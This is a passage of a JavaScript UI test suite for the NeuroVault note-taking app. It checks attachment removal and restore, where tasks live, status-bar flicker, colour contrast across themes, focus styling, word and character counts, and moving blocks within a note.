          if (noneState !== 'Convert 0 sheets disabled true' || one !== 'Convert 1 sheet' || JSON.stringify(got) !== '[["Budget 2026.xlsx",["Lookups"]]]' || S.modal === 'do-ask') bad('R57 the sheets picked go to convert_file', `${sc}: ${R.r57[sc]}`);
          out.combos++; }
        // Attach: no sheets, Add; the drag overlay; Open file asks in the same dialog
        let m = ask('1366x768'); m.querySelector('[data-act="dq-pick"][data-v="attach"]').click(); await new Promise(r => setTimeout(r, 20)); m = app.querySelector('.do-ask');
        const attach = `sheets ${!!m.querySelector('.dq-sheets')} · "${txt(m.querySelector('[data-act="dq-add"]'))}"`; app.querySelector('[data-act="dq-x"]').click();
        const overlay = doOverlayText({ kind: 'xlsx', n: 1 })[0];
        await openPaths(['C:/Users/you/Downloads/Budget 2026.xlsx']); const opened = S.modal === 'do-ask' && DROPO.ask?.files?.[0]?.kind === 'xlsx' && !!app.querySelector('.do-ask .dq-file-name');
        R.r57.more = `attach: ${attach} · overlay "${overlay}" · kind ${doKind('x.XLSX')} · Open file asks ${opened}`;
        if (attach !== 'sheets false · "Add"' || overlay !== 'Drop to add the workbook' || doKind('x.XLSX') !== 'xlsx' || !opened) bad('R57 Attach, the drag overlay and Open file', R.r57.more);
        out.combos++;
      } finally { doConvert = keepConv; DROPO.ask = null; S.modal = null; renderAll(); } }

    // 19 · QC 88: Remove takes an attachment out of the app, never into the Recycle Bin. Its button says the file stays; the Undo
    //      bar says "Removed … from NeuroVault · the file stays in attachments/"; the Timeline lists the removal under its own
    //      filter, Attachments, with Restore; Restore brings it back (no app: a stand-in); "Clean up unused" stays the one action
    //      named for the Recycle Bin
    { R.qc88 = {}; const pdf = SAMPLE_ATTS[4].file, txt = el => (el?.textContent || '').replace(/\s+/g, ' ').trim();
      set({ screen: '1366x768', sample: 'typical', view: 'notes', modal: null, inspector: 'shown' }); S.tab = 'files'; S.attOpen = pdf; renderAll();
      const btn = app.querySelector(`.att-detail [data-act="att-remove"][data-v="${CSS.escape(pdf)}"]`), trash = !!btn?.querySelector('svg') && btn.innerHTML.includes(ICON.trash);
      btn?.click(); await new Promise(r => setTimeout(r, 30)); const msg = HOLD.cur?.msg || '', gone = !D.atts.some(x => x.file === pdf) && !note().md.includes(pdf);
      holdUndo(); await new Promise(r => setTimeout(r, 30)); const back = D.atts.some(x => x.file === pdf) && note().md.includes(pdf);
      R.qc88.remove = `button "${btn?.title}" bin icon ${trash} · Undo bar "${msg}" · out ${gone} · Undo brings it back ${back}`;
      if (!btn || !/the file stays in attachments\//.test(btn.title) || trash || !/^Removed audit-quote\.pdf from NeuroVault: out of 1 note · the file stays in attachments\/$/.test(msg) || /recycle/i.test(msg) || !gone || !back)
        bad('QC 88 Remove only takes it out of the app', R.qc88.remove);
      // the Timeline: the removal, its filter and Restore
      S.attOpen = null; S.tab = 'outline'; const keepEv = D.events;
      D.events = [{ id: 'r-7', at: new Date().toISOString(), time: '10:21', range: 'Today', type: 'Attachments', noteId: note().id, file: 'cards.html', restoreId: 7, restored: false,
        title: `Removed cards.html from “${note().title}”`, desc: 'The file is still in attachments/ · Restore puts it back' }, ...keepEv];
      S.range = 'All'; S.type = 'Attachments'; set({ view: 'history', modal: null });
      const row = app.querySelector('#timeline-feed-container .feed-item'), rb = row?.querySelector('[data-act="att-restore"]'), types = txt(app.querySelector('.bm-group, .side-body') || app);
      R.qc88.timeline = `"${txt(row?.querySelector('.feed-title'))}" · ${txt(row?.querySelector('.tl-type'))} · "${txt(row?.querySelector('.feed-desc'))}" · Restore ${!!rb} · filter Attachments ${/Attachments/.test(types)}`;
      rb?.click(); await new Promise(r => setTimeout(r, 30)); const after = app.querySelector('#timeline-feed-container .feed-item');
      R.qc88.timeline += ` · after Restore: "${txt(after?.querySelector('.feed-desc'))}", ${after?.querySelector('[data-act="att-restore"]') ? 'Restore still there' : txt(after?.querySelector('.btn')) || 'no button'}`;
      if (!rb || !/^Removed cards\.html from “/.test(txt(row?.querySelector('.feed-title'))) || txt(row?.querySelector('.tl-type')) !== 'Attachments' || !/Restore puts it back/.test(txt(row?.querySelector('.feed-desc')))
        || after?.querySelector('[data-act="att-restore"]') || !/Restored/.test(txt(after?.querySelector('.feed-desc')))) bad('QC 88 the Timeline has the removal, with Restore', R.qc88.timeline);
      D.events = keepEv; S.type = 'All';
      // the Recycle Bin only by name: Settings → Vault & files → Unused attachments
      S.setSec = 'vault'; set({ view: 'notes', modal: 'settings' }); const un = [...app.querySelectorAll('.set-row')].find(r => /Unused attachments/.test(txt(r)));
      R.qc88.unused = txt(un).slice(0, 160); S.modal = null; renderAll(); out.combos++; }

    // 20 · R59: tasks kept out of notes. Settings → Vault & files → Where tasks live; Only in Tasks asks once (Cancel · Leave them
    //      in the notes · Move them to Tasks, the last the main); Move takes the lines out of the note's text, keeps every task and
    //      its link, and the Timeline has it with Restore; the note's quiet "N tasks from this note" opens them in Tasks; a new task
    //      never goes into the note's text; a voice ramble's ticked tasks aren't lines; Leave keeps the old ones in their notes
    { R.r59 = {}; const txt = el => (el?.textContent || '').replace(/\s+/g, ' ').trim(), keepT = { on: TKO.on, left: TKO.left, since: TKO.since }, keepEv = D.events, keepSave59 = saveSettings;
      saveSettings = () => {};
      const fresh = () => { set({ screen: '1366x768', sample: 'typical', view: 'notes', modal: null }); Object.assign(TKO, { on: false, left: false, since: '', ask: null, saved: [], demoMoves: {} }); D.events = [];
        const n = note(); n.md = 'Intro\n\n{{tasks}}\n\n- [ ] Ring the printer\n\nEnd'; n.html = null; n.lineBase = ['Ring the printer'];
        D.tasks = D.tasks.filter(t => t.noteId !== n.id).concat([{ id: 't-r59a', noteId: n.id, title: 'Write the brief', priority: 'Medium', due: 'Upcoming', done: false, energy: 'medium' },
          { id: 't-r59b', noteId: n.id, title: 'Ring the printer', priority: 'Medium', due: 'Upcoming', done: false, energy: 'medium' }]); renderAll(); return n; };
      try {
        let n = fresh(); S.setSec = 'vault'; set({ modal: 'settings' }); const row = app.querySelector('.tko-set');
        R.r59.setting = row ? txt(row.querySelector('.set-label')) + ': ' + [...row.querySelectorAll('.seg-opt')].map(b => txt(b) + (b.getAttribute('aria-pressed') === 'true' ? '*' : '')).join(' / ') : 'no row';
        const here = tkoCountHere(); row?.querySelector('[data-v="out"]').click(); await new Promise(r => setTimeout(r, 30));   // the sample's other notes have tasks too
        const m = app.querySelector('.tko-ask'), btns = [...(m?.querySelectorAll('.modal-foot .btn') || [])].map(txt), body = txt(m?.querySelector('.modal-body'));
        R.r59.ask = `"${txt(m?.querySelector('.modal-title'))}" · ${btns.join(' | ')} · "${body.slice(0, 90)}"`;
        if (R.r59.setting !== 'Where tasks live: In their notes* / Only in Tasks' || btns.join('|') !== 'Cancel|Leave them in the notes|Move them to Tasks' || !body.startsWith(`${here.total} tasks are in ${here.notes.length} notes now`) || !/Nothing is deleted/.test(body))
          bad('R59 Where tasks live, and the one question', `${R.r59.setting} · ${R.r59.ask}`);
        app.querySelector('.tko-ask [data-act="tko-cancel"]').click(); await new Promise(r => setTimeout(r, 20));
        const cancelled = !TKO.on && !S.modal && n.md.includes('{{tasks}}');
        // Move: the lines leave the text, every task stays and keeps its link; the Timeline row with Restore
        set({ modal: 'settings' }); app.querySelector('.tko-set [data-v="out"]').click(); await new Promise(r => setTimeout(r, 30)); const nT = D.tasks.length;
        app.querySelector('.tko-ask [data-act="tko-move"]').click(); for (let i = 0; i < 20 && S.modal; i++) await new Promise(r => setTimeout(r, 20));
        const moved = n.md === 'Intro\n\nEnd' && TKO.on && D.tasks.length === nT && D.tasks.filter(t => t.noteId === n.id).length === 2, saved = JSON.stringify(TKO.saved.at(-1) || {});
        S.modal = null; S.noteId = n.id; set({ view: 'notes' }); const link = app.querySelector('.note-head .tko-link'), linkT = txt(link);
        // a new task while it's on: linked, not in the text
        await addTask({ title: 'Book the room', noteId: n.id, priority: 'Medium', energy: 'medium', due: null }); renderAll(); const link2 = txt(app.querySelector('.note-head .tko-link'));
        const notInText = !n.md.includes('{{tasks}}') && !n.md.includes('Book the room');
        app.querySelector('.note-head .tko-link')?.click(); await new Promise(r => setTimeout(r, 30));
        const inTasks = UI.view === 'tasks' && S.taskFilter === 'note:' + n.id && taskBase().length === 3 && taskLabel() === `From “${n.title}”`;
        R.r59.move = `cancel leaves it off ${cancelled} · moved ${moved} (${saved}) · link "${linkT}" → "${link2}" · new task not in the text ${notInText} · opens Tasks ${inTasks}`;
        if (!cancelled || !moved || !/"tasks_keep_out":true/.test(saved) || linkT !== '2 tasks from this note' || link2 !== '3 tasks from this note' || !notInText || !inTasks) bad('R59 Move, the quiet link, a new task and Tasks', R.r59.move);
        // the Timeline: the move under Tasks, with Restore, which puts the lines back
        S.range = 'All'; S.type = 'Tasks'; set({ view: 'history' }); const tr = app.querySelector(`#timeline-feed-container .feed-item[data-note="${CSS.escape(n.id)}"]`), rb = tr?.querySelector('[data-act="tko-restore"]');
        const trT = `"${txt(tr?.querySelector('.feed-title'))}" · ${txt(tr?.querySelector('.tl-type'))} · Restore ${!!rb}`; rb?.click(); await new Promise(r => setTimeout(r, 30));
        R.r59.timeline = `${trT} · after Restore the note ${n.md === 'Intro\n\n{{tasks}}\n\n- [ ] Ring the printer\n\nEnd' ? 'is as it was' : JSON.stringify(n.md)}`;
        if (!rb || !/^"Moved 2 tasks out of “/.test(trT) || !/ · Tasks · /.test(trT) || n.md !== 'Intro\n\n{{tasks}}\n\n- [ ] Ring the printer\n\nEnd') bad('R59 the Timeline has the move, with Restore', R.r59.timeline);
        S.type = 'All';
        // a voice ramble's ticked tasks aren't "- [ ]" lines with Only in Tasks
        const vm = taskMd([{ title: 'Ticked', on: true }, { title: 'Not ticked', on: false }]); TKO.on = false; const vmOff = taskMd([{ title: 'Ticked', on: true }]); TKO.on = true;
        // Leave: the old tasks stay in their note; a new one doesn't show there
        n = fresh(); S.setSec = 'vault'; set({ modal: 'settings' }); app.querySelector('.tko-set [data-v="out"]').click(); await new Promise(r => setTimeout(r, 30));
        app.querySelector('.tko-ask [data-act="tko-leave"]').click(); await new Promise(r => setTimeout(r, 20));
        const leftShown = taskLines(n).map(t => t.title).join(','); await addTask({ title: 'Later task', noteId: n.id, priority: 'Medium', energy: 'medium', due: null });
        const afterNew = taskLines(n).map(t => t.title).join(',');
        // back to In their notes
        S.modal = 'settings'; renderAll(); app.querySelector('.tko-set [data-v="in"]').click(); await new Promise(r => setTimeout(r, 20));
        R.r59.more = `voice on "${vm}" · off "${vmOff}" · leave: ${TKO.saved.find(x => x.tasks_keep_out_left) ? 'left' : '?'} shows ${leftShown} → after a new one ${afterNew} · back to in ${!TKO.on}`;
        if (vm !== '- Not ticked' || vmOff !== '- [ ] Ticked' || leftShown !== 'Write the brief' || afterNew !== 'Write the brief' || TKO.on) bad('R59 voice, Leave, and back to In their notes', R.r59.more);
        out.combos++;
      } finally { saveSettings = keepSave59; Object.assign(TKO, keepT, { ask: null }); D.events = keepEv; S.modal = null; S.taskFilter = 'All'; set({ view: 'notes', sample: 'typical' }); renderAll(); } }

    // 21 · v0.1.0 parity: nothing built says Coming soon. Settings → Editor had the old "Online dictionary fallback · Coming soon"
    //      row above R56's Dictionary card (the online lookup is built: Look it up online, config dict_online). Every settings page:
    //      no row greyed as Coming soon for a feature that is built; Editor has no Coming soon at all
    { const built = /dictionar|synonym|online|mind map|split|wrap-up|pdf|xlsx|spreadsheet|code block|tasks|timeline|voice|read aloud/i, found = [];
      for (const [sec] of SET_SECTIONS) { S.setSec = sec; set({ screen: '1920x1080', modal: 'settings' }); const pane = app.querySelector('.settings-pane');
        [...(pane?.querySelectorAll('[data-soon], [title*="Coming soon"], .is-soon') || [])].forEach(el => { const t = (el.getAttribute('title') || el.getAttribute('data-tip') || el.textContent || '').replace(/\s+/g, ' ').trim(); if (sec === 'editor' || built.test(t)) found.push(`${sec}: ${t.slice(0, 80)}`); });
        if (sec === 'editor' && /Coming soon|Online dictionary fallback/.test(pane?.textContent || '')) found.push('editor: the words "Coming soon" or the old fallback row');
        out.combos++; }
      S.modal = null; renderAll(); R.soon = found.join(' | ') || 'no Coming soon for a built feature; none in Editor';
      if (found.length) bad('a built feature still says Coming soon', R.soon);
      if ('dictOnline' in S.a11y) bad('the old a11y.dictOnline is still kept', ''); }

    // 22 · QC 96 (feedback: "There is a flashing status bar text that appears next to the word count"): it was "Saving…", drawn for a
    //      few ms after every pause in typing, which moved the word count. While you type, the quick saves draw nothing; a slow save
    //      shows "Saving…" after 0.6 s and keeps it 0.8 s; an AI job's messages and a burst of messages change the text at most 3
    //      times a second, the latest last; and the word count never moves
    { const keepGap = STATUS_HOLD.gap, wait = ms => new Promise(r => setTimeout(r, ms)), changes = [], spots = new Set(), seen = [];
      STATUS_HOLD.gap = 700; status.clear(); status.at = 0; set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null, side: true, inspector: 'shown', zen: 'off' }); S.mode = 'wysiwyg'; renderAll();
      let last = null; const t0 = performance.now();
      const look = () => { const sv = app.querySelector('.status-save'), wc = app.querySelector('#word-count-display'), txt = sv && !sv.hidden ? sv.querySelector('#status-text')?.textContent || '' : '';
        if (wc) spots.add(Math.round(wc.getBoundingClientRect().left));
        if (txt !== last) { if (last !== null) changes.push(performance.now() - t0); last = txt; seen.push(`${Math.round(performance.now() - t0)}ms ${txt || '—'}`); } };
      const mo = new MutationObserver(look); mo.observe(app, { subtree: true, childList: true, attributes: true, characterData: true }); look();
      const save = async ms => { SAVE.busy++; paintSave(); await wait(ms); SAVE.busy--; paintSave(); };
      try {
        const doc = app.querySelector('.doc[contenteditable="true"]'); doc?.focus(); const sel = getSelection(); if (doc) { sel.selectAllChildren(doc); sel.collapseToEnd(); }
        for (let b = 0; b < 3; b++) { for (let i = 0; i < 8; i++) { document.execCommand('insertText', false, 'ab '[i % 3]); await wait(60); } await save(80); await wait(150); }   // typing, with a quick save after each pause
        const quick = seen.some(x => /Saving/.test(x));
        await save(1500); await wait(900); const slow = seen.filter(x => /Saving/.test(x)), slowFor = (() => { const i = seen.findIndex(x => /Saving/.test(x)); return i < 0 || !seen[i + 1] ? 0 : parseInt(seen[i + 1]) - parseInt(seen[i]); })();
        status('Asking Groq…'); renderAll(); await wait(150); status('Thinking…'); renderAll(); await wait(200); for (let k = 0; k < 5; k++) { renderAll(); await wait(60); } status('Answer ready · by Groq'); renderAll();   // an AI job
        for (let k = 0; k < 8; k++) { status('Burst ' + k); await wait(50); } await wait(900);   // a burst of messages
        mo.disconnect(); look();
        let most = 0; changes.forEach((t, i) => { most = Math.max(most, changes.filter(u => u >= t && u < t + 1000).length); });
        R.qc96 = `quick saves drew "Saving…" ${quick} · slow save shown ${slow.length ? slowFor + 'ms' : 'never'} · at most ${most} changes a second · word count at ${[...spots].join('/')}px · ends "${last}" · ${seen.join(' | ')}`;
        if (quick) bad('QC 96 a quick save while typing draws nothing', R.qc96);
        if (!slow.length || slowFor < 700) bad('QC 96 a slow save shows "Saving…", then keeps it', R.qc96);
        if (most > 3) bad('QC 96 the status bar text changes at most 3 times a second', R.qc96);
        if (spots.size > 1) bad('QC 96 the word count never moves', R.qc96);
        if (last !== 'Burst 7') bad('QC 96 the latest message is the one left showing', R.qc96);
        out.combos++;
      } finally { mo.disconnect(); STATUS_HOLD.gap = keepGap; SAVE.busy = 0; SAVE.err = null; UI.state = 'ready'; status.clear(); renderAll(); } }

    // 23 · v0.1.1 (UI cohesion review, must-fix 1 and 4): text on the danger button, and grey text on accent-tinted surfaces, reach AA
    //      (4.5:1) in all 9 themes, with every accent of each, and the colour-vision settings; the danger fill stands out from the
    //      card (3:1). Measured on the real classes: .btn--danger, the launch quote's second line, Add a file's picked choice,
    //      "+ Insert" in Check your voice note
    { const cv = Object.assign(document.createElement('canvas'), { width: 1, height: 1 }), cx = cv.getContext('2d', { willReadFrequently: true });
      const rgba = c => { cx.clearRect(0, 0, 1, 1); cx.fillStyle = '#000'; cx.fillStyle = c; cx.fillRect(0, 0, 1, 1); const d = cx.getImageData(0, 0, 1, 1).data; return [d[0], d[1], d[2], d[3] / 255]; };
      const over = (top, under) => top[3] >= 1 ? top : [0, 1, 2].map(i => top[i] * top[3] + under[i] * (1 - top[3])).concat(1);
      const bgOf = el => { const layers = []; for (let x = el; x; x = x.parentElement) { const c = rgba(getComputedStyle(x).backgroundColor); if (c[3] > 0) { layers.push(c); if (c[3] >= 1) break; } } return layers.reverse().reduce((acc, c) => over(c, acc), [255, 255, 255, 1]); };
      const lum = c => { const f = v => { v /= 255; return v <= .03928 ? v / 12.92 : ((v + .055) / 1.055) ** 2.4; }; return .2126 * f(c[0]) + .7152 * f(c[1]) + .0722 * f(c[2]); };
      const ratio = (a, b) => { const x = lum(a), y = lum(b); return (Math.max(x, y) + .05) / (Math.min(x, y) + .05); };
      const keep = { theme: READER.theme, picks: { ...AC.picks }, cvd: AC.cvd }, worst = {}, fails = [];
      set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null });
      const host = document.createElement('div'); host.className = 'card'; host.style.cssText = 'position:fixed;left:8px;top:8px;z-index:99999;padding:12px;background:var(--card)';
      host.innerHTML = `<button class="btn btn--danger" data-k="danger">Delete</button><blockquote class="launch-quote"><p>Note</p><div class="list-item-sub" data-k="launch quote">Yesterday-you, 17:04</div></blockquote>
        <div class="dq-choices"><button class="dq-choice" role="radio" aria-checked="true"><span class="dq-choice-t"><b>Link</b><span data-k="picked choice">A link to the file where you dropped it</span></span></button></div>
        <p class="list-item-sub">Words <button class="anchor-insert" data-k="+ Insert">+ Insert</button></p>`;
      try {
        for (const [th] of THEMES) for (const [acc] of (ACCENT_SETS[th] || [['violet']])) for (const cvd of (acc === (ACCENT_SETS[th] || [['violet']])[0][0] ? ['off', 'rg', 'tri'] : ['off'])) {
          READER.theme = th; AC.picks[th] = acc; AC.cvd = cvd; applyReader(); applyAccent(); app.querySelector('.app-body > .main')?.appendChild(host);
          host.querySelectorAll('[data-k]').forEach(el => { const k = el.dataset.k, fg = over(rgba(getComputedStyle(el).color), bgOf(el)), r = ratio(fg, bgOf(el));
            if (!worst[k] || r < worst[k][0]) worst[k] = [r, `${th}/${acc}/${cvd}`]; if (r < 4.5) fails.push(`${k} ${r.toFixed(2)}:1 in ${th}/${acc}${cvd !== 'off' ? '/' + cvd : ''}`);
            if (k === 'danger') { const fill = rgba(getComputedStyle(el).backgroundColor), r2 = ratio(fill, bgOf(host)); if (r2 < 3) fails.push(`the danger fill ${r2.toFixed(2)}:1 on the card in ${th}/${cvd}`); if (!worst.fill || r2 < worst.fill[0]) worst.fill = [r2, `${th}/${cvd}`]; } });
          host.remove(); out.combos++; }
      } finally { host.remove(); READER.theme = keep.theme; AC.picks = keep.picks; AC.cvd = keep.cvd; applyReader(); applyAccent(); renderAll(); }
      R.contrast = Object.entries(worst).map(([k, [r, w]]) => `${k} ≥ ${r.toFixed(2)}:1 (${w})`).join(' · ');
      if (fails.length) bad('v0.1.1 danger and accent-tint text reach AA in every theme', `${fails.length} misses: ${[...new Set(fails)].slice(0, 12).join(' | ')}`); }

    // 24 · v0.1.1 (must-fix 3; design profile "No focus rings on a writing box"): every box you type in (text inputs and textareas)
    //      keeps its plain border when focused: no accent frame, no outline, no ring. Every view, every Settings page and the
    //      dialogs that have one; buttons, tabs and menus keep theirs
    { const TYPED = 'input:not([type=checkbox]):not([type=radio]):not([type=range]):not([type=color]):not([type=file]):not([type=button]):not([type=submit]):not([type=hidden]), textarea';
      const look = el => { const c = getComputedStyle(el); return `${c.borderTopColor}|${c.borderBottomColor}|${c.outlineStyle === 'none' || parseFloat(c.outlineWidth) === 0 ? 'none' : c.outlineStyle + ' ' + c.outlineColor}|${c.boxShadow}`; };
      const rings = [], seenSel = new Set(), skipped = new Set(); let n = 0;
      const sweep = where => { app.querySelectorAll(TYPED).forEach(el => { if (!el.offsetParent || el.disabled || el.readOnly) return; const before = look(el); el.focus({ preventScroll: true }); if (document.activeElement !== el) return;
        el.classList.add('is-focus'); const after = look(el); el.classList.remove('is-focus'); el.blur(); n++;
        const id = (el.id ? '#' + el.id : '') + '.' + [...el.classList].join('.'); if (before !== after && !seenSel.has(id)) { seenSel.add(id); const [b, a2] = [before.split('|'), after.split('|')];
          rings.push(`${where} ${el.tagName.toLowerCase()}${id}: ${['border', 'border', 'outline', 'shadow'].filter((_, i) => b[i] !== a2[i]).filter((v, i, x) => x.indexOf(v) === i).join(', ')}`); } }); };
      try {
        for (const th of ['slate', 'paper']) {
          set({ screen: '1920x1080', theme: th, sample: 'typical', modal: null, side: true, inspector: 'shown' });
          for (const v of ['notes', 'tasks', 'timer', 'history', 'dict', 'newtab']) { set({ view: v }); sweep(`${th}/${v}`); out.combos++; }
          for (const [sec] of SET_SECTIONS) { S.setSec = sec; try { set({ view: 'notes', modal: 'settings' }); } catch (e) { skipped.add(`settings ${sec} (${e.message.slice(0, 40)})`); S.modal = null; continue; } sweep(`${th}/settings ${sec}`); out.combos++; }
          set({ modal: null }); openPalette(); sweep(`${th}/Ctrl+K`); closeModal(); out.combos++;
          set({ view: 'notes', modal: null }); const n0 = note(); if (n0) { S.ctx = null; app.querySelector('#note-tags-input, .tag-input')?.click(); sweep(`${th}/note head`); }
        }
      } finally { set({ theme: 'obsidian', modal: null, view: 'notes' }); }
      R.focus = `${n} typing boxes focused · ${rings.length ? rings.slice(0, 12).join(' | ') : 'none framed'}${skipped.size ? ` · not drawn here: ${[...skipped].join(', ')}` : ''}`;
      if (rings.length) bad('v0.1.1 a box you type in keeps its plain border when focused', rings.join(' | ')); }

    // 25 · QC 97 (feedback: "I no longer have character count next to the word count"): "N characters" and "N min read" sit beside the
    //      word count whenever the note area has room: all three from 760px, the characters down to 580px. The bar never overflows,
    //      the counts stay clear of the message column, and typing doesn't hide, show or move them (QC 96)
    { const seen = [], fw = frame.style.width;
      const look = () => { const sb = app.querySelector('.status-bar'), m = app.querySelector('.app-body > .main'), on = id => { const el = app.querySelector('#' + id); return !!el && getComputedStyle(el).display !== 'none' && el.getBoundingClientRect().width > 0; };
        const msg = sb?.querySelector('.status-msg')?.getBoundingClientRect(), wc = app.querySelector('#word-count-display')?.getBoundingClientRect();
        return { main: Math.round(m?.getBoundingClientRect().width || 0), words: on('word-count-display'), chars: on('char-count-display'), read: on('read-time-display'),
          over: sb ? sb.scrollWidth - sb.clientWidth : 99, clash: !!(msg && wc && wc.left < msg.right - .5), at: wc ? Math.round(wc.left) : -1, text: app.querySelector('#char-count-display')?.textContent || '' }; };
      try {
        for (const [W, side, insp] of [[1920, true, 'shown'], [1536, true, 'shown'], [1366, true, 'shown'], [1366, false, 'shown'], [1280, true, 'shown'], [1180, true, 'shown'], [1100, true, 'shown'], [1366, true, 'hidden'], [900, false, 'hidden'], [760, false, 'hidden']]) {
          set({ screen: '1366x768', sample: 'typical', view: 'notes', modal: null, side, inspector: insp, zen: 'off' }); frame.style.width = W + 'px'; renderAll();
          const r = look(), want = { chars: r.main >= 580, read: r.main >= 760 }; seen.push(`${W}${side ? '+side' : ''}${insp === 'shown' ? '+panel' : ''}: main ${r.main} ${r.words ? 'W' : '-'}${r.chars ? 'C' : '-'}${r.read ? 'R' : '-'}`);
          if (!r.words) bad('QC 97 the word count always shows on a note', `${W}px: main ${r.main}`);
          if (r.chars !== want.chars || r.read !== want.read) bad('QC 97 characters show from 580px of note area, "min read" from 760px', `${W}px${side ? ' + sidebar' : ''}${insp === 'shown' ? ' + panel' : ''}: main ${r.main}, characters ${r.chars}, min read ${r.read}`);
          if (r.chars && !/^\d[\d,]* characters$/.test(r.text)) bad('QC 97 the characters read "N characters"', r.text);
          if (r.over > 1) bad('QC 97 the status bar never overflows', `${W}px: main ${r.main}, ${r.over}px too wide`);
          if (r.clash) bad('QC 97 the counts stay clear of the message column', `${W}px: main ${r.main}`);
          out.combos++;
        }
        // the user's case: 1366 with the sidebar and the right panel; typing never hides, shows or moves a count
        set({ screen: '1366x768', sample: 'typical', view: 'notes', modal: null, side: true, inspector: 'shown', zen: 'off' }); S.mode = 'wysiwyg'; renderAll();
        const doc = app.querySelector('.doc[contenteditable="true"]'), r0 = look(), states = new Set(); doc?.focus(); const sel = getSelection(); if (doc) { sel.selectAllChildren(doc); sel.collapseToEnd(); }
        for (let i = 0; i < 30; i++) { document.execCommand('insertText', false, 'word '.slice(i % 5, i % 5 + 1)); if (i % 6 === 5) renderAll(); const r = look(); states.add(`${r.chars}${r.read}@${r.at}`); }
        seen.push(`typing at main ${r0.main}: ${[...states].join(', ')}`);
        if (!r0.chars || !r0.read) bad('QC 97 the user\'s 1366 window, sidebar and panel open, shows characters and min read', `main ${r0.main}`);
        if (states.size > 1) bad('QC 97 typing never hides, shows or moves a count', [...states].join(', '));
        out.combos++;
      } finally { frame.style.width = fw; set({ screen: '1920x1080', side: true, inspector: 'shown', modal: null }); }
      R.qc97 = seen.join(' · '); }

    // 26 · QC 105 (feedback: "… move and attachement, or code snippet up or down the note"): attachment cards, code blocks, tables,
    //      images and callouts move up and down: Alt+Shift+↑ / ↓ (the block the caret is in, or the one picked with its handle), and a
    //      hover handle at the block's left edge to drag. Each kind moves with all its parts; the .md keeps every line, in the new
    //      order, and reads back the same; Ctrl+Z is one step; the front matter stays first; elsewhere the keys do nothing new
    { let n = note(); const Q = [], qb = (k, v) => bad('QC 105 ' + k, v);
      const MARK = ['tags: [plan]', 'Intro line', 'budget.docx', 'const a = 1', '| Region', '[!note]', 'photo.png', 'Last line'], KIND = ['', 'attachment', 'code', 'table', 'callout', 'image', ''];
      const MD = '---\ntags: [plan]\n---\nIntro line.\n\n![[attachments/budget.docx]]\n\n```js\nconst a = 1;\n```\n\n| Region | Spent |\n| --- | --- |\n| North | 12 |\n\n> [!note] Heads up\n> Body text.\n\n![[attachments/photo.png]]\n*A caption*\n\n<!-- nv-pins 24.0,30.0 -->\n\n1. Pin one\n\nLast line.\n';
      const doc = () => app.querySelector('.ed-pane > .doc[contenteditable="true"]'), md = () => { n.docDirty = true; syncDoc(n); return n.md; };   // what the editor saves now
      const order = s => MARK.map(m => [m, s.indexOf(m)]).sort((a, b) => a[1] - b[1]).map(x => MARK.indexOf(x[0]));
      const lines = s => s.split('\n').filter(x => x.trim()).sort().join('\n');
      const key = (d, el) => { const e = new KeyboardEvent('keydown', { key: d < 0 ? 'ArrowUp' : 'ArrowDown', altKey: true, shiftKey: true, bubbles: true, cancelable: true }); (el || doc()).dispatchEvent(e); return e.defaultPrevented; };
      const caretIn = el => { doc().focus(); el = el.querySelector(':scope > code') || el; const t = document.createTreeWalker(el, NodeFilter.SHOW_TEXT).nextNode(); edPut([t || el, 0]); };
      try {
        for (const scr of ['1920x1080', '1366x768']) {
          set({ screen: scr, sample: 'typical', view: 'notes', modal: null, side: true, inspector: 'shown', zen: 'off' }); S.mode = 'wysiwyg'; PH.mode = 'both'; n = note();
          n.md = MD; n.html = null; n.docDirty = false; EDH.delete(n.id); renderAll(); BLK.pick = BLK.hover = BLK.drag = null;
          const md0 = md(), o0 = order(md0).join(''), us = blkUnits(doc()), kinds = us.map(u => u.kind);
          Q.push(`${scr}: units ${kinds.map(k => k || '·').join(' ')}`);
          if (o0 !== '01234567') qb('the test note draws as written', `${o0} · ${md0.slice(0, 120)}`);
          if (kinds.join() !== KIND.join()) qb('the blocks are found: an attachment, code, a table, a callout, an image', kinds.join());
          const ph = us[5]; if (!ph || ph.nodes.length < 4 || !ph.nodes.some(x => x.nodeType === 8) || !ph.nodes.some(x => x.nodeName === 'OL')) qb('a photo moves with its caption, pins and pin list', ph ? ph.nodes.map(x => x.nodeName).join(' ') : 'none');
          // the keys: each kind down one and back up; the caret's block, or the picked one (a card has no caret)
          for (let i = 1; i <= 5; i++) {
            const want = [0, 1, 2, 3, 4, 5, 6, 7], a = i + 1; [want[a], want[a + 1]] = [want[a + 1], want[a]];
            const u = blkUnits(doc())[i]; if (u.kind === 'attachment' || u.kind === 'image') BLK.pick = { id: n.id, i }; else { BLK.pick = null; caretIn(u.nodes[0].nodeName === 'TABLE' ? u.nodes[0].querySelector('td') : u.nodes[0]); }
            const took = key(1), m1 = md(), o1 = order(m1).join('');
            if (!took || o1 !== want.join('')) qb(`Alt+Shift+↓ moves the ${KIND[i]} down one`, `${scr}: order ${o1}, wanted ${want.join('')}`);
            if (lines(m1) !== lines(md0)) qb(`the ${KIND[i]} keeps every line when it moves`, `${scr}: ${m1.slice(0, 160)}`);
            n.html = null; renderAll(); if (md() !== m1) qb(`the moved ${KIND[i]} reads back the same from the .md`, scr);
            if (BLK.pick) BLK.pick = { id: n.id, i: i + 1 }; else caretIn(blkUnits(doc())[i + 1].nodes[0].nodeName === 'TABLE' ? blkUnits(doc())[i + 1].nodes[0].querySelector('td') : blkUnits(doc())[i + 1].nodes[0]);
            key(-1); const m2 = md(); if (m2 !== md0) qb(`Alt+Shift+↑ puts the ${KIND[i]} back`, `${scr}: order ${order(m2).join('')}`);
            out.combos++;
          }
          // one Ctrl+Z step; the front matter stays first; the ends say so; a plain paragraph's keys do nothing new
          BLK.pick = null; n.md = MD; n.html = null; EDH.delete(n.id); renderAll(); caretIn(blkUnits(doc())[2].nodes[0]);
          key(-1); const mu = md(); edUndo(doc()); const mz = md();
          if (order(mu).join('') !== '01324567' || mz !== md0) qb('Ctrl+Z puts a move back in one step', `${scr}: moved ${order(mu).join('')}, after Ctrl+Z ${order(mz).join('')}`);
          BLK.pick = { id: n.id, i: 0 }; key(-1); BLK.pick = null; if (md() !== md0) qb('nothing goes above the front matter', order(md()).join(''));
          caretIn(blkUnits(doc())[0].nodes[0]); const plain = key(1); if (plain || md() !== md0) qb('in a plain paragraph the keys do nothing new', `prevented ${plain}`);
          // the handle: over each of the five kinds, at the block's left edge, outside the note's text; none on a paragraph
